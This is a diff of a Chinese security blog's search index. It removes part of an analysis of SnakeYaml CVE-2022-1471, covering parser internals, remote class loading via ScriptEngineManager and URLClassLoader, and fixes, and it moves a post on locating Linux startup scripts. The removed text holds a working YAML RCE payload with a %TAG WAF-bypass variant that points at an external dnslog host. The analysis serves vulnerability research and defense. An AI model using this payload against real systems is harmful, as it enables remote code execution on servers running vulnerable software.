-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164251442.png" alt="image-20230814164251442"></p>
-<p>我们首先关注getSingleNode方法。进入该方法会首先通过解析器对事件进行配置</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164458986.png" alt="image-20230814164458986"></p>
-<p>可以看到获取事件时其实时同故宫state对象进行创建的，而state对象其实是一个Production接口的实例。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164703271.png" alt="image-20230814164703271"></p>
-<p>其有很多的实现类，分别对应不同的节点类型的不同处理阶段。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164959202.png" alt="image-20230814164959202"></p>
-<p>我们在初始化解析器的时候会初始化state对下个为ParseStreamStart的实例</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165131638.png" alt="image-20230814165131638"></p>
-<p>故此处调用的produce方法即是<code>org.yaml.snakeyaml.parser.ParserImpl.ParseStreamStart#produce</code>，在该方法中获取了获取了流解析开始事件并重置了state为下一阶段的隐式文档解析开始状态。每一个事件中都包含两个重要的标志Mark，一个称之为startMark一个称之为endMark，分别标识了当前事件处理的开始与结束位置</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165258362.png" alt="image-20230814165258362"></p>
-<p>在获取到事件后，判断事件是否为流结束事件，若不是则进入到节点解析逻辑。在此逻辑开始时会调用getEvent方法获取一个开始事件，待composeNode方法调用完毕后，再嗲用getEvent方法获取到一个结束事件，最后对锚点与记录的递归节点进行清理。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170038625.png" alt="image-20230814170038625"></p>
-<p>在composeNode方法中主要有两个分支，如果你的序列化数据设置了锚点与别名此时会进入第一个分支，若没有则会进入到else分支，我们这里会进入到else分支。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170426979.png" alt="image-20230814170426979"></p>
-<p>在else分支中还是首先会把事件往前推一次，获得的NodeEvent主要包含三种类型分别为ScalarNode SequenceNode MappingNode，即我们开始谈到的Yaml格式的三种类型标量、序列以及映射，很明显我们这里会进入到序列的处理逻辑里面。</p>
-<p>在composeSequenceNode方法中首先设置事件为SequenceStartEvent，即序列处理开始，然后会尝试获取Tag，关于tag的内容可以在<a href="https://yaml.org/spec/1.2.2/#tag-shorthands%E4%BA%86%E8%A7%A3%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASequenceNode%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9C%A8%E6%9E%84%E9%80%A0SequenceNode%E5%AF%B9%E8%B1%A1%E6%97%B6%E4%BC%9A%E5%B0%86children%E5%BD%93%E4%BD%9C%E5%8F%82%E6%95%B0%E4%BC%A0%E8%BF%9B%E5%8E%BB%E8%B5%8B%E5%80%BC%E7%BB%99%E5%B1%9E%E6%80%A7this.value%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93ArrayList%E6%98%AF%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%8B%A5%E4%BB%A5%E5%A4%96%E7%A7%92%E5%AF%B9children%E7%9A%84%E4%BF%AE%E6%94%B9%E5%B0%86%E5%BD%B1%E5%93%8D%E5%88%B0SequenceNode%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82%E7%84%B6%E5%90%8E%E5%97%B2%E7%94%A8composeNode%E6%96%B9%E6%B3%95%E7%BB%A7%E7%BB%AD%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%90%8E%E8%A7%81%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0children%E4%B8%AD%E4%BD%9C%E4%B8%BASequenceNode%E7%9A%84%E5%AD%90%E8%8A%82%E7%82%B9%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%E5%B0%B1%E5%B7%B2%E7%BB%8F%E5%BC%80%E5%A7%8B%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%88%B0StreamEnd%E3%80%82">https://yaml.org/spec/1.2.2/#tag-shorthands了解，然后创建一个SequenceNode对象，在构造SequenceNode对象时会将children当作参数传进去赋值给属性this.value，我们知道ArrayList是引用类型，若以外秒对children的修改将影响到SequenceNode中的值。然后嗲用composeNode方法继续进行节点后见并添加到children中作为SequenceNode的子节点。到这里就已经开始递归解析了，直到解析到StreamEnd。</a></p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170947063.png" alt="image-20230814170947063"></p>
-<p>在获取到Node后，就进入到目标对象构建的流程中</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172249327.png" alt="image-20230814172249327"></p>
-<p>在constructObject方法中还对获取到的node对象进行了缓存检查</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172306770.png" alt="image-20230814172306770"></p>
-<p>在调用getConstructor时会首先从预设好的13中内置构造器中尝试选择，若没有匹配的则返回一个ConstructYamlObject的构造器，然后调用器ConstructYamlObject的getConstructor方法通过反射的方式获得目标类的Class实例，然后根据Node类型获取到不同的几点构造器，此处为ContructSequence</p>
-<p>然后调用器construct方法，该方法也时通过节点tag的不同类型选择不同的处理逻辑，这里会进入到可变对象的对象构建逻辑中。由下图，在这个逻辑中会首先获取当前Node的value属性，也就是子节点的尺寸然后与获得的目标类的构造方法的参数尺寸进行比较，若成功匹配则依次对直接点调用constructObjec递归构建对象然后作为父节点的构造方法参数传参同通过反射的方式进行实例化。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814173636570.png" alt="image-20230814173636570"></p>
-<p>在我们提供的payload中，也就是最终我们要构建的类是javax.script.ScriptEngineManager，构造该类调用的是其含有一个参数的有参构造方法，其参数为一个类加载器java.net.URLClassLoader，而在构造java.net.URLClassLoader时也是调用其含有一个参数的有参构造方法不过其参数时一个数组，所以我们会考到java.net.URLClassLoader后嵌套了两层[[，其数组类型为java.net.URL。我们知道URLClassLoader会从传入的URL进行远程的类加载工作，那么这个payload极有可能涉及到远程恶意类加载与实例化。那么ScriptEngineManager的构造方法又做了什么呢</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174418936.png" alt="image-20230814174418936"></p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174500741.png" alt="image-20230814174500741"></p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174437825.png" alt="image-20230814174437825"></p>
-<p>可以看到这是一个很明显的SPI调用过程，我们只需要在远程部署一个实现了ScriptEngineFactory接口的类，并子啊其静态代码块中写入命令执行的代码，并在其Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactory文件中应用该实现类即可完成利用。具体的远程RCE可以上网自行寻找。</p>
-<p>在最新版的snake中该漏洞得到了修复，官方通过在loadConfigs对象中引入了新的配置项并且限制了反序列化递归调用嵌套深度的方式来对反序列化漏洞进行了限制。</p>
-<p>限制递归深度在org.yaml.snakeyaml.composer.Composer#increaseNestingDepth方法中检查，最大深度默认为50层</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193403071.png" alt="image-20230814193403071"></p>
-<p>目标类类型检查在下图处检查，首先节点Tag是否是自定义的全局tag如果是则调用org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowed方法进行检查，TagInspector是一个接口，其默认实现是org.yaml.snakeyaml.inspector.UnTrustedTagInspector。isGlobalTagAllowed方法默认返回false，即不允许使用全局的Tag。</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193503552.png" alt="image-20230814193503552"></p>
-<p>我们在编写代码的时候如果需要指定发序列化的目标类类型则必须要实现TagInspector接口，重写isGlobalTagAllowed方法，然后将其注入到LoaderOptions实例化对象中。</p>
-<p>默认不允许使用全局tag</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194127911.png" alt="image-20230814194127911"></p>
-<p>实现TagInspector接口，此处直接返回true，也可以在isGlobalTagAllowed方法中根据tag来进行逻辑判断决定允许哪些类能被反序列化。</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194330452.png" alt="image-20230814194330452"></p>
-<p>重写isGlobalTagAllowed方法后的结果</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194609615.png" alt="image-20230814194609615"></p>
-<p>远程类加载</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194851114.png" alt="image-20230814194851114"></p>
-<p>在分析的过程中我发现了一些好玩的地方，手下时除了load方法可以利用该payload外，如果我们使用的时loadAs方法被人制定了目标类的类型应该怎么办？</p>
-<p>当然如果类型不匹配，即ScriptEngineFactory如果不是目标类的子类或这实现类，就没得玩，但是如果是一些抽象级别比较高的类还是大有可为的，比如xxxx组件就是这么干的，嗯一个CVE到手了。</p>
-<p>两外我们可以利用Yaml语法中的TAG特性来实现WAF绕过，我们只需要对payload进行以下的变形</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
-
-<p>依旧RCE，还可以用来绕WAF</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814195046711.png" alt="image-20230814195046711"></p>
-<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
-<li>升级软件到不受影响的版本或最新版，最新版maven仓库地址：<a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1。</a></li>
-<li>限制服务器出网</li>
-</ol>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471</a></li>
-<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2022-1471">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2022-1471</a></li>
-<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471</a></li>
-<li><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></li>
-<li><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</a></li>
-<li><a href="https://www.cnblogs.com/R0ser1/p/16213257.html">https://www.cnblogs.com/R0ser1/p/16213257.html</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
-        <tag>反序列化</tag>
-        <tag>网络安全</tag>
-        <tag>漏洞分析</tag>
-        <tag>漏洞</tag>
-        <tag>SnakeYaml</tag>
-        <tag>CVE-2022-1471</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Spring Kafka 消息头反序列化漏洞（CVE-2023-34040）</title>
     <url>/2025/04/10/Spring-Kafka%E6%B6%88%E6%81%AF%E5%A4%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040/</url>
     <content><![CDATA[<h1 id="Spring-Kafka消息头反序列化漏洞（CVE-2023-34040）"><a href="#Spring-Kafka消息头反序列化漏洞（CVE-2023-34040）" class="headerlink" title="Spring Kafka消息头反序列化漏洞（CVE-2023-34040）"></a>Spring Kafka消息头反序列化漏洞（CVE-2023-34040）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>Spring for Apache Kafka (Spring - Kafka)项目将Spring的核心概念应用于基于Kafka的消息传递解决方案的开发。它提供了一个“template”作为发送消息的高级抽象。它还支持带有@KafkaListener注解和“listener container”的消息驱动POJOs 。这些库提倡使用依赖注入和声明式的使用方式。所有这些例子都与Spring框架的JMS支持和Spring AMQP对RabbitMQ的支持有相似之处。</p>
@@ -786,6 +795,25 @@
       </tags>
   </entry>
   <entry>
+    <title>如何快速在设备中查找程序启动脚本</title>
+    <url>/2025/04/10/%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%9C%A8%E8%AE%BE%E5%A4%87%E4%B8%AD%E6%9F%A5%E6%89%BE%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<p>在拿到设备固件或者镜像文件后，若要进行更进一步的漏洞挖掘，我们便需要找到与当前设备功能相关联的软件的位置与启动方式等信息。<br>一般来讲如果只知道软件的位置便进行分析可能措施很多关键的信息，如：程序运行时设置的环境变量以及一些配置信息的设置。  </p>
+<span id="more"></span>
+
+<p>大多数情况下，程序在启动时并不是直接从elf文件启动，而是启动自shell脚本，同时为了能够让程序在每次重启系统或者开机时自动启动，<br>这些程序往往被注册成service可能被嵌入到一些其他在linux启动过程中会自动执行的脚本或者目录中。为了厘清在linux启动过程中究竟有哪些脚本被自动执行了，<br>我们首先需要对linux的启动过程有一个大概得了解。  </p>
+<p>在用户按下电源按钮启动系统是，首先发挥总用的是bios系统，启主要完成的功能包括POST，即开机自检，主要完成对系统的硬件进行检查等工作；<br>在bios系统完成其使命后期会通过其内部设置去尝试访问不同的存储介质尝试拉起系统，<br>在Windos下进行PE启动时我们往往会进入到bios选择操作系统的引导位置为USB就是这一过程的体现，一般情况下，操作系统的引导位置都是硬盘；<br>在堆硬盘进行访问时，首先会读取硬盘的主引导分区中的信息，住引导分区中存储着的便是我们通常所说的bootloader（拉着自己鞋带向上提），<br>bootloader一般包括两部分，一部分由汇编编写，主要完成一些依赖CPU体系的初始化工作，并调用第二部分代码，第二部分由C语言来实现，<br>常见的bootloader包括grub grub2 uboot等，我们在启动linux时通常会见到一个让我们选择系统内核版本的界面，该界面就是bootloader在起作用；<br>在bootloader将操作系统内核加载到内存中后将开始运行操作系统的第一个程序，在最新版本的linux中通常是systemd程序而在较低版本中可能是init；<br>之后会选择系统的运行级别runlevel，在此过程中会加载运行一些etcrc.d目录下的脚本运行；再之后便会进入到用户登录选项了，<br>在用户输入正确的用户名密码登录后会加载etcprofile - etcprofile.d.sh -~.bash_profile - ~.bashrc - etcbashrc等文件初始化环境变量。  </p>
+<p>在linux启动过程中凡是涉及到自动脚本执行的地方都有可能被修改插入设备程序启动脚本的地方，在查找时可以逐一排查。<br>不过，一般情况下更普遍的做法是将程序的启动过程注册为service。linux系统中的service可以通过命令systemctl 查看，<br>找到我们感兴趣的服务然后执行systemctl show service_name便可以查看与该服务相关的信息，我们可以从中找到服务的存储位置，<br>如：etcsystemdsystemdefault.target.wants.service  usrlibsystemdsystem.service  查看对应的service文件我们便可以找到相关的启动脚本所在位置，<br>然后通过阅读启动脚本了解程序启动过程中设置的环境变量、配置、启动参数等信息。  </p>
+<p>除了这种追本溯源的方式，还有一种更加简单直接的方式，我们可以通过查进程的方式找到相关得信息。比如我们要找一个java程序，<br>可以直接执行ps -ef  grep java  便可以找到相关的程序的启动命令。如果只知道启动的端口，我们可以先执行netstat -tulnp查看到对应的PID信息，<br>然后通过PID使用命令ps命令也可以。  </p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏挖技巧</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WebFlux Security 认证绕过（CVE-2023-34034）</title>
     <url>/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/</url>
     <content><![CDATA[<h1 id="WebFlux-Security-认证绕过（CVE-2023-34034）"><a href="#WebFlux-Security-认证绕过（CVE-2023-34034）" class="headerlink" title="WebFlux Security 认证绕过（CVE-2023-34034）"></a>WebFlux Security 认证绕过（CVE-2023-34034）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>Spring WebFlux 是 Spring Framework 5.0 中引入的新的响应式Web框架。与Spring MVC不同，它不需要Servlet API，是完全异步且非阻塞的，并且通过Reactor项目实现了Reactive Streams规范。Spring WebFlux 可用于创建基于事件循环执行模型的完全异步且非阻塞的应用程序。</p>
@@ -880,25 +908,6 @@
         <tag>WebFlux Security</tag>
         <tag>CVE-2023-34034</tag>
         <tag>认证绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何快速在设备中查找程序启动脚本</title>
-    <url>/2025/04/10/%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%9C%A8%E8%AE%BE%E5%A4%87%E4%B8%AD%E6%9F%A5%E6%89%BE%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<p>在拿到设备固件或者镜像文件后，若要进行更进一步的漏洞挖掘，我们便需要找到与当前设备功能相关联的软件的位置与启动方式等信息。<br>一般来讲如果只知道软件的位置便进行分析可能措施很多关键的信息，如：程序运行时设置的环境变量以及一些配置信息的设置。  </p>
-<span id="more"></span>
-
-<p>大多数情况下，程序在启动时并不是直接从elf文件启动，而是启动自shell脚本，同时为了能够让程序在每次重启系统或者开机时自动启动，<br>这些程序往往被注册成service可能被嵌入到一些其他在linux启动过程中会自动执行的脚本或者目录中。为了厘清在linux启动过程中究竟有哪些脚本被自动执行了，<br>我们首先需要对linux的启动过程有一个大概得了解。  </p>
-<p>在用户按下电源按钮启动系统是，首先发挥总用的是bios系统，启主要完成的功能包括POST，即开机自检，主要完成对系统的硬件进行检查等工作；<br>在bios系统完成其使命后期会通过其内部设置去尝试访问不同的存储介质尝试拉起系统，<br>在Windos下进行PE启动时我们往往会进入到bios选择操作系统的引导位置为USB就是这一过程的体现，一般情况下，操作系统的引导位置都是硬盘；<br>在堆硬盘进行访问时，首先会读取硬盘的主引导分区中的信息，住引导分区中存储着的便是我们通常所说的bootloader（拉着自己鞋带向上提），<br>bootloader一般包括两部分，一部分由汇编编写，主要完成一些依赖CPU体系的初始化工作，并调用第二部分代码，第二部分由C语言来实现，<br>常见的bootloader包括grub grub2 uboot等，我们在启动linux时通常会见到一个让我们选择系统内核版本的界面，该界面就是bootloader在起作用；<br>在bootloader将操作系统内核加载到内存中后将开始运行操作系统的第一个程序，在最新版本的linux中通常是systemd程序而在较低版本中可能是init；<br>之后会选择系统的运行级别runlevel，在此过程中会加载运行一些etcrc.d目录下的脚本运行；再之后便会进入到用户登录选项了，<br>在用户输入正确的用户名密码登录后会加载etcprofile - etcprofile.d.sh -~.bash_profile - ~.bashrc - etcbashrc等文件初始化环境变量。  </p>
-<p>在linux启动过程中凡是涉及到自动脚本执行的地方都有可能被修改插入设备程序启动脚本的地方，在查找时可以逐一排查。<br>不过，一般情况下更普遍的做法是将程序的启动过程注册为service。linux系统中的service可以通过命令systemctl 查看，<br>找到我们感兴趣的服务然后执行systemctl show service_name便可以查看与该服务相关的信息，我们可以从中找到服务的存储位置，<br>如：etcsystemdsystemdefault.target.wants.service  usrlibsystemdsystem.service  查看对应的service文件我们便可以找到相关的启动脚本所在位置，<br>然后通过阅读启动脚本了解程序启动过程中设置的环境变量、配置、启动参数等信息。  </p>
-<p>除了这种追本溯源的方式，还有一种更加简单直接的方式，我们可以通过查进程的方式找到相关得信息。比如我们要找一个java程序，<br>可以直接执行ps -ef  grep java  便可以找到相关的程序的启动命令。如果只知道启动的端口，我们可以先执行netstat -tulnp查看到对应的PID信息，<br>然后通过PID使用命令ps命令也可以。  </p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>漏挖技巧</tag>
       </tags>
   </entry>
 </search>
